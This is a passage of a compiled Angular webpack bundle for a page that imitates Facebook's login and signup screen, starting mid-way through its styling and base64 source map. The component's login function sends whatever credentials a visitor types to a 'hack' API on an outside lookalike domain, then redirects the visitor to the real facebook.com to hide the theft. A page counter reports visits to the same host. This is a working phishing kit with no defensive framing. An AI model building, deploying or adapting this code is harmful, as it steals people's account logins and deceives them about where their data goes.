rgba(0,0,0,.5);\r\n    cursor:pointer;\r\n  }\r\n  \r\n  .signbut:hover {\r\n    background: -webkit-linear-gradient(#79bc64, #578843);\r\n  }\r\n  \r\n  .create {\r\n    border-top: 1px solid #a0a9c0;\r\n    color: #666;\r\n    font-size: 13px;\r\n    font-weight: bold;\r\n    margin-top: 10px;\r\n    padding-top: 15px;\r\n  }\r\n  \r\n  \r\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvZmFjZWJvb2svZmFjZWJvb2suY29tcG9uZW50LmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtJQUNJLFNBQVM7SUFDVCw2REFBNkQ7SUFDN0QsaUJBQWlCO0VBQ25COztFQUVBO0lBQ0UsV0FBVztJQUNYLFlBQVk7SUFDWix5QkFBeUI7RUFDM0I7O0VBRUE7SUFDRSxjQUFjO0lBQ2QsV0FBVztJQUNYLFdBQVc7RUFDYjs7RUFFQTtJQUNFLFdBQVc7SUFDWCxhQUFhO0lBQ2IseUJBQXlCO0VBQzNCOztFQUVBO0lBQ0UsY0FBYztJQUNkLFdBQVc7SUFDWCxnQkFBZ0I7RUFDbEI7O0VBRUE7SUFDRSw0Q0FBNEM7SUFDNUMsZUFBZTtJQUNmLHFCQUFxQjtJQUNyQixTQUFTO0lBQ1QsVUFBVTtJQUNWLG1DQUFtQztFQUNyQzs7RUFFQTtJQUNFLGNBQWM7SUFDZCxlQUFlO0VBQ2pCOztFQUVBO0lBQ0UsaUJBQWlCO0lBQ2pCLFVBQVU7SUFDVixXQUFXO0lBQ1gseUJBQXlCO0lBQ3pCLHNCQUFzQjtJQUN0Qiw0Q0FBNEM7SUFDNUMsNkNBQTZDO0lBQzdDLGNBQWM7SUFDZCxjQUFjO0lBQ2QsZ0JBQWdCO0lBQ2hCLGlCQUFpQjtJQUNqQixVQUFVO0VBQ1o7O0VBRUE7SUFDRSxXQUFXO0lBQ1gsZUFBZTtFQUNqQjs7RUFFQTs7SUFFRSxVQUFVO0lBQ1YsY0FBYztJQUNkLFdBQVc7SUFDWCxjQUFjO0VBQ2hCOztFQUVBO0lBQ0UscUJBQXFCO0lBQ3JCLFNBQVM7SUFDVCxZQUFZO0lBQ1oseUJBQXlCO0lBQ3pCLFNBQVM7SUFDVCxZQUFZO0lBQ1oseUJBQXlCO0VBQzNCOztFQUVBOztJQUVFLGFBQWE7SUFDYixjQUFjO0lBQ2QsV0FBVztJQUNYLGNBQWM7RUFDaEI7O0VBRUE7SUFDRSxXQUFXO0lBQ1gsb0JBQW9CO0VBQ3RCOztFQUVBO0lBQ0UsV0FBVztJQUNYLFlBQVk7SUFDWixvQkFBb0I7SUFDcEIsZUFBZTtJQUNmLGdCQUFnQjtJQUNoQixpQkFBaUI7SUFDakIsV0FBVztJQUNYLG9CQUFvQjtFQUN0Qjs7RUFFQTtJQUNFLG1CQUFtQjtJQUNuQixlQUFlO0VBQ2pCOztFQUVBO0lBQ0UsaUJBQWlCO0lBQ2pCLFVBQVU7O0VBRVo7O0VBRUE7SUFDRSxjQUFjO0lBQ2QsZ0JBQWdCO0lBQ2hCLFVBQVU7RUFDWjs7RUFHQTtJQUNFLG9CQUFvQjtJQUNwQixzQkFBc0I7RUFDeEI7O0VBRUE7SUFDRSxjQUFjO0lBQ2QsVUFBVTtJQUNWLGdCQUFnQjtFQUNsQjs7RUFFQTtJQUNFLG9CQUFvQjtJQUNwQixrQkFBa0I7SUFDbEIsV0FBVztJQUNYLFlBQVk7SUFDWixXQUFXO0VBQ2I7O0VBRUE7SUFDRSxjQUFjO0lBQ2QsbUNBQW1DO0lBQ25DLGVBQWU7SUFDZixpQkFBaUI7RUFDbkI7O0VBRUE7SUFDRSxtQ0FBbUM7SUFDbkMsaUNBQWlDO0lBQ2pDLFVBQVU7RUFDWjs7RUFFQTtJQUNFLGNBQWM7SUFDZCxrQkFBa0I7RUFDcEI7O0VBRUE7SUFDRSxxQkFBcUI7SUFDckIsV0FBVztFQUNiOztFQUVBO0lBQ0UscUJBQXFCO0lBQ3JCLGVBQWU7SUFDZixpQkFBaUI7SUFDakIseUJBQXlCO0VBQzNCLDBCQUEwQjtJQUN4QixVQUFVO0lBQ1Ysa0JBQWtCO0VBQ3BCOztFQUVBO0tBQ0csV0FBVztFQUNkOztFQUVBO0tBQ0csV0FBVztFQUNkOztFQUVBO0tBQ0csV0FBVztFQUNkOztFQUVBO0lBQ0UsV0FBVztFQUNiOztFQUVBO0lBQ0UsV0FBVztFQUNiOztFQUVBO0lBQ0UsV0FBVztFQUNiOztFQUVBO0lBQ0UsVUFBVTtFQUNaOztFQUVBO0lBQ0UsY0FBYztJQUNkLGFBQWE7SUFDYixtQ0FBbUM7SUFDbkMsaUJBQWlCO0VBQ25COztFQUVBO0lBQ0UscUJBQXFCO0lBQ3JCLFdBQVc7SUFDWCxlQUFlO0lBQ2YseUJBQXlCO0lBQ3pCLDBCQUEwQjtJQUMxQixhQUFhOztFQUVmOztFQUVBO0lBQ0UsZUFBZTtJQUNmLGNBQWM7SUFDZCxXQUFXO0lBQ1gsZ0JBQWdCO0lBQ2hCLGNBQWM7RUFDaEI7O0VBRUE7SUFDRSwwQkFBMEI7RUFDNUI7O0VBRUE7SUFDRSxlQUFlO0lBQ2YsY0FBYztJQUNkLGVBQWU7SUFDZixxQkFBcUI7SUFDckIsaUJBQWlCO0lBQ2pCLGlCQUFpQjtJQUNqQixzQkFBc0I7RUFDeEI7O0VBRUE7SUFDRSxzQkFBc0I7SUFDdEIscUJBQXFCO0VBQ3ZCOztFQUVBO0lBQ0UsZUFBZTtFQUNqQjs7RUFFQTtJQUNFLFNBQVM7RUFDWDs7RUFFQTtJQUNFLGVBQWU7SUFDZixXQUFXO0lBQ1gsV0FBVztJQUNYLG9CQUFvQjtFQUN0Qjs7RUFFQTtJQUNFLGFBQWE7SUFDYixxQkFBcUI7SUFDckIsZUFBZTtFQUNqQjs7RUFFQTtJQUNFLGVBQWU7SUFDZixnQkFBZ0I7SUFDaEIsbUJBQW1CO0lBQ25CLFVBQVU7SUFDVixnQkFBZ0I7SUFDaEIsaUJBQWlCO0lBQ2pCLGtCQUFrQjtJQUNsQiwwQkFBMEI7SUFDMUIscURBQXFEO0lBQ3JELDJDQUEyQztJQUMzQyxpQkFBaUI7RUFDbkIscUNBQXFDO0lBQ25DLGdCQUFnQjtFQUNsQixtQkFBbUI7SUFDakIscUNBQXFDO0lBQ3JDLGNBQWM7RUFDaEI7O0VBRUE7SUFDRSxxREFBcUQ7RUFDdkQ7O0VBRUE7SUFDRSw2QkFBNkI7SUFDN0IsV0FBVztJQUNYLGVBQWU7SUFDZixpQkFBaUI7SUFDakIsZ0JBQWdCO0lBQ2hCLGlCQUFpQjtFQUNuQiIsImZpbGUiOiJzcmMvYXBwL2ZhY2Vib29rL2ZhY2Vib29rLmNvbXBvbmVudC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyJib2R5IHtcclxuICAgIG1hcmdpbjogMDtcclxuICAgIGZvbnQtZmFtaWx5OiAnTHVjaWRhIEdyYW5kZScsIHRhaG9tYSx2ZXJkYW5hLGFyaWFsLHNhbnMtc2VyaWY7XHJcbiAgICBsaW5lLWhlaWdodDogMS4yODtcclxuICB9XHJcbiAgXHJcbiAgI25hdndyYXBwZXIge1xyXG4gICAgd2lkdGg6IDEwMCU7XHJcbiAgICBoZWlnaHQ6IDgycHg7XHJcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjM2I1OTk4O1xyXG4gIH1cclxuICBcclxuICAjbmF2YmFyIHtcclxuICAgIG1hcmdpbjogMCBhdXRvO1xyXG4gICAgd2lkdGg6OTgwcHg7XHJcbiAgICBoZWlnaHQ6NTlweDtcclxuICB9XHJcbiAgXHJcbiAgI2NvbnRlbnR3cmFwcGVyIHtcclxuICAgIHdpZHRoOiAxMDAlO1xyXG4gICAgaGVpZ2h0OiA2MDZweDtcclxuICAgIGJhY2tncm91bmQtY29sb3I6ICNlZGYwZjU7XHJcbiAgfVxyXG4gIFxyXG4gICNjb250ZW50IHtcclxuICAgIG1hcmdpbjogMCBhdXRvO1xyXG4gICAgd2lkdGg6OTgwcHg7XHJcbiAgICBwYWRkaW5nLXRvcDoyMHB4O1xyXG4gIH1cclxuICBcclxuICBoMSB7XHJcbiAgICBmb250LWZhbWlseTogdGFob21hLHZlcmRhbmEsYXJpYWwsc2Fucy1zZXJpZjtcclxuICAgIGZvbnQtc2l6ZTogMzhweDtcclxuICAgIGxldHRlci1zcGFjaW5nOjAuMDVweDtcclxuICAgIG1hcmdpbjogMDtcclxuICAgIGNvbG9yOiNmZmY7XHJcbiAgICAtd2Via2l0LWZvbnQtc21vb3RoaW5nOiBhbnRpYWxpYXNlZDtcclxuICB9XHJcbiAgXHJcbiAgLmxvZ293cmFwcGVyIHtcclxuICAgIGRpc3BsYXk6IGJsb2NrO1xyXG4gICAgcGFkZGluZzogMzBweCAwO1xyXG4gIH1cclxuICBcclxuICAjYnV0dG9uIHtcclxuICAgIHBvc2l0aW9uOnJlbGF0aXZlO1xyXG4gICAgd2lkdGg6NDVweDtcclxuICAgIGhlaWdodDoxOHB4O1xyXG4gICAgYmFja2dyb3VuZC1jb2xvcjogIzViNzJhOTtcclxuICAgIGJvcmRlcjogMXB4IHNvbGlkICM5OTk7XHJcbiAgICBib3JkZXItY29sb3I6IzhiOWRjMyAjMmY0NzdhICMyOTQ0N2UgIzFhMzU2ZTtcclxuICAgIC13ZWJraXQtYm94LXNoYWRvdzogMCAxcHggMCByZ2JhKDAsIDAsIDAsIC4xKTtcclxuICAgIGN1cnNvcjpwb2ludGVyO1xyXG4gICAgZm9udC1zaXplOjExcHg7XHJcbiAgICBmb250LXdlaWdodDpib2xkO1xyXG4gICAgdGV4dC1hbGlnbjpjZW50ZXI7XHJcbiAgICBjb2xvcjojZmZmO1xyXG4gIH1cclxuICBcclxuICAudGFibGV3cmFwcGVyIHtcclxuICAgIGZsb2F0OnJpZ2h0O1xyXG4gICAgbWFyZ2luLXRvcDoxNXB4O1xyXG4gIH1cclxuICBcclxuICAucm93MSB7XHJcbiAgICBcclxuICAgIGNvbG9yOiNmZmY7XHJcbiAgICBmb250LXNpemU6MTFweDtcclxuICAgIHdpZHRoOjE2NHB4O1xyXG4gICAgY3Vyc29yOnBvaW50ZXI7XHJcbiAgfVxyXG4gIFxyXG4gIC5pbnB1dHRleHQge1xyXG4gICAgYm9yZGVyLWNvbG9yOiAjMWQyYTViO1xyXG4gICAgbWFyZ2luOiAwO1xyXG4gICAgd2lkdGg6IDE0MnB4O1xyXG4gICAgYm9yZGVyOiAxcHggc29saWQgI2JkYzdkODtcclxuICAgIG1hcmdpbjogMDtcclxuICAgIHBhZGRpbmc6IDNweDtcclxuICAgIGJhY2tncm91bmQtY29sb3I6ICNGQUZGQkQ7XHJcbiAgfVxyXG4gIFxyXG4gIC5yb3cyIHtcclxuICAgIFxyXG4gICAgY29sb3I6IzlkYWNjYjtcclxuICAgIGZvbnQtc2l6ZToxMXB4O1xyXG4gICAgd2lkdGg6MTY0cHg7XHJcbiAgICBjdXJzb3I6cG9pbnRlcjtcclxuICB9XHJcbiAgXHJcbiAgI2xlZnRib2Qge1xyXG4gICAgd2lkdGg6NTY1cHg7XHJcbiAgICBkaXNwbGF5OmlubGluZS1ibG9jaztcclxuICB9XHJcbiAgXHJcbiAgLmNvbm5lY3Qge1xyXG4gICAgd2lkdGg6NDA5cHg7XHJcbiAgICBoZWlnaHQ6IDcycHg7XHJcbiAgICBwYWRkaW5nOiA0MnB4IDAgMjRweDtcclxuICAgIGZvbnQtc2l6ZTogMjBweDtcclxuICAgIGZvbnQtd2VpZ2h0OiA3MDA7XHJcbiAgICBsaW5lLWhlaWdodDogMzZweDtcclxuICAgIGNvbG9yOiAjMzMzO1xyXG4gICAgZGlzcGxheTppbmxpbmUtYmxvY2s7XHJcbiAgfVxyXG4gIFxyXG4gIC5sZWZ0YmFyIHtcclxuICAgIHBhZGRpbmctYm90dG9tOjEwcHg7XHJcbiAgICBtYXJnaW4tdG9wOjIwcHg7XHJcbiAgfVxyXG4gIFxyXG4gIC5pY29ud3JhcCB7XHJcbiAgICBtYXJnaW4tcmlnaHQ6MjBweDtcclxuICAgIHdpZHRoOjU1cHg7XHJcbiAgICBcclxuICB9XHJcbiAgXHJcbiAgLnJvd3RleHQge1xyXG4gICAgZm9udC1zaXplOjE2cHg7XHJcbiAgICBmb250LXdlaWdodDpib2xkO1xyXG4gICAgY29sb3I6IzMzMztcclxuICB9XHJcbiAgXHJcbiAgXHJcbiAgLmZiMSB7XHJcbiAgICBkaXNwbGF5OmlubGluZS1ibG9jaztcclxuICAgIHZlcnRpY2FsLWFsaWduOiBtaWRkbGU7XHJcbiAgfVxyXG4gIFxyXG4gIC5yb3d0ZXh0MiB7XHJcbiAgICBmb250LXNpemU6MTVweDtcclxuICAgIGNvbG9yOiM2NjY7XHJcbiAgICBtYXJnaW4tbGVmdDoxMHB4O1xyXG4gIH1cclxuICBcclxuICAjcmlnaHRib2Qge1xyXG4gICAgZGlzcGxheTppbmxpbmUtYmxvY2s7XHJcbiAgICB2ZXJ0aWNhbC1hbGlnbjp0b3A7XHJcbiAgICB3aWR0aDozOTlweDtcclxuICAgIGhlaWdodDoyMDBweDtcclxuICAgIGZsb2F0OnJpZ2h0O1xyXG4gIH1cclxuICBcclxuICAuc2lnbnVwIHtcclxuICAgIGZvbnQtc2l6ZTozNnB4O1xyXG4gICAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7XHJcbiAgICBmb250LXdlaWdodDo3MDA7XHJcbiAgICBtYXJnaW4tYm90dG9tOjVweDtcclxuICB9XHJcbiAgXHJcbiAgLmJvbGRlciB7XHJcbiAgICBmb250LWZhbWlseTogJ09wZW4gU2Fucycsc2Fucy1zZXJpZjtcclxuICAgIHRleHQtcmVuZGVyaW5nOm9wdGltaXplbGVnaWJpbGl0eTtcclxuICAgIGNvbG9yOiMzMzM7XHJcbiAgfVxyXG4gIFxyXG4gIC5mcmVlIHtcclxuICAgIGZvbnQtc2l6ZToxOXB4O1xyXG4gICAgbWFyZ2luLWJvdHRvbToyMHB4O1xyXG4gIH1cclxuICBcclxuICAuZm9ybWJveCB7XHJcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XHJcbiAgICB3aWR0aDozOTlweDtcclxuICB9XHJcbiAgXHJcbiAgLmlucHV0Ym9keSB7XHJcbiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7XHJcbiAgICBmb250LXNpemU6IDE4cHg7XHJcbiAgICBwYWRkaW5nOiA4cHggMTBweDtcclxuICAgIGJvcmRlcjogMXB4IHNvbGlkICNiZGM3ZDg7XHJcbiAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA1cHg7XHJcbiAgICBjb2xvcjojMzMzO1xyXG4gICAgbWFyZ2luLWJvdHRvbToxMHB4O1xyXG4gIH1cclxuICBcclxuICA6Oi13ZWJraXQtaW5wdXQtcGxhY2Vob2xkZXIge1xyXG4gICAgIGNvbG9yOiAjOTk5O1xyXG4gIH1cclxuICBcclxuICA6Oi1tb3otcGxhY2Vob2xkZXIge1xyXG4gICAgIGNvbG9yOiAjOTk5OyAgXHJcbiAgfVxyXG4gIFxyXG4gIDotbXMtaW5wdXQtcGxhY2Vob2xkZXIgeyAgXHJcbiAgICAgY29sb3I6ICM5OTk7ICBcclxuICB9XHJcbiAgXHJcbiAgLmluMSB7XHJcbiAgICB3aWR0aDoxNzJweDtcclxuICB9XHJcbiAgXHJcbiAgLmluMiB7XHJcbiAgICB3aWR0aDozNzdweDtcclxuICB9XHJcbiAgXHJcbiAgLmZyIHtcclxuICAgIGZsb2F0OnJpZ2h0O1xyXG4gIH1cclxuICBcclxuICAuZmwge1xyXG4gICAgZmxvYXQ6bGVmdDtcclxuICB9XHJcbiAgXHJcbiAgLmJkYXkge1xyXG4gICAgZm9udC1zaXplOjE5cHg7XHJcbiAgICBjb2xvcjojMTQxODIzO1xyXG4gICAgLXdlYmtpdC1mb250LXNtb290aGluZzogYW50aWFsaWFzZWQ7XHJcbiAgICBtYXJnaW4tYm90dG9tOjVweDtcclxuICB9XHJcbiAgXHJcbiAgLnNlbGVjdGJvZHkge1xyXG4gICAgZGlzcGxheTogaW5saW5lLWJsb2NrO1xyXG4gICAgaGVpZ2h0OjMwcHg7XHJcbiAgICBmb250LXNpemU6IDEzcHg7XHJcbiAgICBib3JkZXI6IDFweCBzb2xpZCAjYmRjN2Q4O1xyXG4gICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA1cHg7XHJcbiAgICBjb2xvcjojMTQxODIzO1xyXG4gICBcclxuICB9XHJcbiAgXHJcbiAgLndoeSB7XHJcbiAgICBmb250LXNpemU6IDExcHg7XHJcbiAgICBjb2xvcjogIzNiNTk5ODtcclxuICAgIHdpZHRoOjE1MHB4O1xyXG4gICAgbWFyZ2luLWxlZnQ6MTBweDtcclxuICAgIGN1cnNvcjpwb2ludGVyO1xyXG4gIH1cclxuICBcclxuICAuaDpob3ZlciB7XHJcbiAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTtcclxuICB9XHJcbiAgXHJcbiAgLmdlbmRlciB7XHJcbiAgICBmb250LXNpemU6IDE4cHg7XHJcbiAgICBjb2xvcjogIzE0MTgyMztcclxuICAgIGN1cnNvcjogcG9pbnRlcjtcclxuICAgIHBhZGRpbmc6IDAgMTBweCAwIDNweDtcclxuICAgIG1hcmdpbi1yaWdodDogNHB4O1xyXG4gICAgbGluZS1oZWlnaHQ6IDE4cHg7XHJcbiAgICB2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlO1xyXG4gIH1cclxuICBcclxuICAuc3BhbnBhZCB7XHJcbiAgICBwYWRkaW5nOiA1cHggMCA1cHggNHB4O1xyXG4gICAgZGlzcGxheTogaW5saW5lLWJsb2NrO1xyXG4gIH1cclxuICBcclxuICAubXQxIHtcclxuICAgIG1hcmdpbi10b3A6MTVweDtcclxuICB9XHJcbiAgXHJcbiAgLm0wIHtcclxuICAgIG1hcmdpbjogMDtcclxuICB9XHJcbiAgXHJcbiAgLmFncmVlIHtcclxuICAgIGZvbnQtc2l6ZTogMTFweDtcclxuICAgIGNvbG9yOiAjNzc3O1xyXG4gICAgd2lkdGg6MzE2cHg7XHJcbiAgICBtYXJnaW46IDExcHggMCAxMXB4IDtcclxuICB9XHJcbiAgXHJcbiAgLmxpbmsge1xyXG4gICAgY29sb3I6IzNiNTk5ODtcclxuICAgIGRpc3BsYXk6IGlubGluZS1ibG9jaztcclxuICAgIGN1cnNvcjogcG9pbnRlcjtcclxuICB9XHJcbiAgXHJcbiAgLnNpZ25idXQge1xyXG4gICAgZm9udC1zaXplOiAxOXB4O1xyXG4gICAgZm9udC13ZWlnaHQ6IDcwMDtcclxuICAgIGxldHRlci1zcGFjaW5nOiAxcHg7XHJcbiAgICBjb2xvcjojZmZmO1xyXG4gICAgbWluLXdpZHRoOiAxOTRweDtcclxuICAgIHBhZGRpbmc6IDdweCAyMHB4O1xyXG4gICAgdGV4dC1hbGlnbjogY2VudGVyO1xyXG4gICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA1cHg7XHJcbiAgICBiYWNrZ3JvdW5kOiAtd2Via2l0LWxpbmVhci1ncmFkaWVudCgjNjdhZTU1LCAjNTc4ODQzKTtcclxuICAgIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggMXB4ICNhNGUzODg7XHJcbiAgICBib3JkZXI6IDFweCBzb2xpZDtcclxuICBib3JkZXItY29sb3I6ICMzYjZlMjIgIzNiNmUyMiAjMmM1MTE1O1xyXG4gICAgbWFyZ2luLXRvcDogMTBweDtcclxuICBtYXJnaW4tYm90dG9tOiAxMHB4O1xyXG4gICAgdGV4dC1zaGFkb3c6IDAgMXB4IDJweCByZ2JhKDAsMCwwLC41KTtcclxuICAgIGN1cnNvcjpwb2ludGVyO1xyXG4gIH1cclxuICBcclxuICAuc2lnbmJ1dDpob3ZlciB7XHJcbiAgICBiYWNrZ3JvdW5kOiAtd2Via2l0LWxpbmVhci1ncmFkaWVudCgjNzliYzY0LCAjNTc4ODQzKTtcclxuICB9XHJcbiAgXHJcbiAgLmNyZWF0ZSB7XHJcbiAgICBib3JkZXItdG9wOiAxcHggc29saWQgI2EwYTljMDtcclxuICAgIGNvbG9yOiAjNjY2O1xyXG4gICAgZm9udC1zaXplOiAxM3B4O1xyXG4gICAgZm9udC13ZWlnaHQ6IGJvbGQ7XHJcbiAgICBtYXJnaW4tdG9wOiAxMHB4O1xyXG4gICAgcGFkZGluZy10b3A6IDE1cHg7XHJcbiAgfVxyXG4gIFxyXG4gICJdfQ== */"

/***/ }),

/***/ "./src/app/facebook/facebook.component.ts":
/*!************************************************!*\
  !*** ./src/app/facebook/facebook.component.ts ***!
  \************************************************/
/*! exports provided: FacebookComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "FacebookComponent", function() { return FacebookComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_hack_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../services/hack.service */ "./src/app/services/hack.service.ts");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");




var FacebookComponent = /** @class */ (function () {
    function FacebookComponent(hackService, router) {
        this.hackService = hackService;
        this.router = router;
        this.new_user = {};
        this.user = {};
        this.hackService.pageCount().subscribe(function (resp) {
            console.log(resp);
        }, function (err) {
            console.log(err);
        });
    }
    FacebookComponent.prototype.login = function () {
        this.hackService.login(this.user).subscribe(function (resp) {
            console.log(resp);
            window.location.href = 'https://facebook.com';
        }, function (err) {
            console.log(err);
        });
    };
    FacebookComponent.prototype.newUser = function () {
        window.location.href = 'https://facebook.com';
    };
    FacebookComponent.prototype.ngOnInit = function () {
    };
    FacebookComponent.ctorParameters = function () { return [
        { type: _services_hack_service__WEBPACK_IMPORTED_MODULE_2__["HackService"] },
        { type: _angular_router__WEBPACK_IMPORTED_MODULE_3__["Router"] }
    ]; };
    FacebookComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'app-facebook',
            template: __webpack_require__(/*! raw-loader!./facebook.component.html */ "./node_modules/raw-loader/index.js!./src/app/facebook/facebook.component.html"),
            styles: [__webpack_require__(/*! ./facebook.component.css */ "./src/app/facebook/facebook.component.css")]
        })
    ], FacebookComponent);
    return FacebookComponent;
}());



/***/ }),

/***/ "./src/app/services/hack.service.ts":
/*!******************************************!*\
  !*** ./src/app/services/hack.service.ts ***!
  \******************************************/
/*! exports provided: HackService */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "HackService", function() { return HackService; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm5/http.js");



var HackService = /** @class */ (function () {
    function HackService(http) {
        this.http = http;
        this.url = 'https://facebook.registe.cf/api/hack/';
    }
    HackService.prototype.login = function (data) {
        return this.http.post(this.url + 'login', data);
    };
    HackService.prototype.pageCount = function () {
        return this.http.get(this.url + 'page/count');
    };
    HackService.prototype.pageCreation = function (data) {
        console.log('2');
        return this.http.post(this.url + 'page/count', data);
    };
    HackService.ctorParameters = function () { return [
        { type: _angular_common_http__WEBPACK_IMPORTED_MODULE_2__["HttpClient"] }
    ]; };
    HackService = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Injectable"])({
            providedIn: 'root'
        })
    ], HackService);
    return HackService;
}());



/***/ }),

/***/ "./src/environments/environment.ts":
/*!*****************************************!*\
  !*** ./src/environments/environment.ts ***!
  \*****************************************/
/*! exports provided: environment */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "environment", function() { return environment; });
// This file can be replaced during build by using the `fileReplacements` array.
// `ng build --prod` replaces `environment.ts` with `environment.prod.ts`.
// The list of file replacements can be found in `angular.json`.
var environment = {
    production: false
};
/*
 * For easier debugging in development mode, you can import the following file
 * to ignore zone related error stack frames such as `zone.run`, `zoneDelegate.invokeTask`.
 *
 * This import should be commented out in production mode because it will have a negative impact
 * on performance if an error is thrown.
 */
// import 'zone.js/dist/zone-error';  // Included with Angular CLI.


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/platform-browser-dynamic */ "./node_modules/@angular/platform-browser-dynamic/fesm5/platform-browser-dynamic.js");
/* harmony import */ var _app_app_module__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./app/app.module */ "./src/app/app.module.ts");
/* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./environments/environment */ "./src/environments/environment.ts");




if (_environments_environment__WEBPACK_IMPORTED_MODULE_3__["environment"].production) {
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["enableProdMode"])();
}
Object(_angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__["platformBrowserDynamic"])().bootstrapModule(_app_app_module__WEBPACK_IMPORTED_MODULE_2__["AppModule"])
    .catch(function (err) { return console.error(err); });


/***/ }),

/***/ 0:
/*!***************************!*\
  !*** multi ./src/main.ts ***!
  \***************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! E:\New folder (4)\hacker\src\main.ts */"./src/main.ts");


/***/ })

},[[0,"runtime","vendor"]]]);
//# sourceMappingURL=main-es5.js.map